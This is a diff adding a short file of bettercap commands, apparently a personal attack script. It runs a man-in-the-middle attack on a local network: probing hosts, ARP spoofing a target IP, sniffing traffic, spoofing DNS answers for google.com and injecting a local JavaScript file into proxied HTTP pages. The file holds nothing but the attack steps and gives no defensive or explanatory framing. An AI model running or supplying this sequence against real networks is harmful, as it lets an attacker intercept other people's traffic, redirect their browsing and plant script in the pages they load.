@@ -1,0 +1,12 @@
+bettercap
+net.probe on
+net.show
+set arp.spoof.targets ip
+arp.spoof on
+net.sniff on
+net.sniff off
+set dns.spoof.domains google.com
+dns.spoof on
+set http.proxy.injectjs ./home/robot/Hacker/javascript.js
+http.proxy on
+
